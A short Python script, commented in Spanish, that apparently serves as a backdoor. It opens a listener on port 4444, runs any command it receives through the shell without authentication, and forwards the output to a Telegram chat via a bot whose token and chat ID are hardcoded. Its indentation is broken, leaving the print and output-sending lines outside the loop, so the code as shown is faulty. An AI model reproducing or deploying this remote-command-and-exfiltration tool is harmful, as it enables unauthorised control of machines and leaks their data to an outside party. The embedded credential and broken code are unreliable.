#!/usr/bin/env python
# -*- coding: utf-8 -*-

import socket
import os
import telebot
TOKEN = "347644672:AAHu5fbP7ot0p98XJLwEUiv-ZH_Trwm9Ybo" # Cambiar por el token
bot = telebot.TeleBot(TOKEN)
cid = "7506285" # Cambiar por el numero cid
ip = "192.168.1.103"
puerto = 4444
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((ip, puerto))
s.listen(1)
while True:
    conn, addr = s.accept()
    cmd = conn.recv(1024)
print(" Comando: " + cmd)
    out = os.popen(cmd).read()
if out != "":
    bot.send_message(cid, "Resultado: " + out)
else:
    bot.send_message(cid, "¡¡Comando sin salida!!")



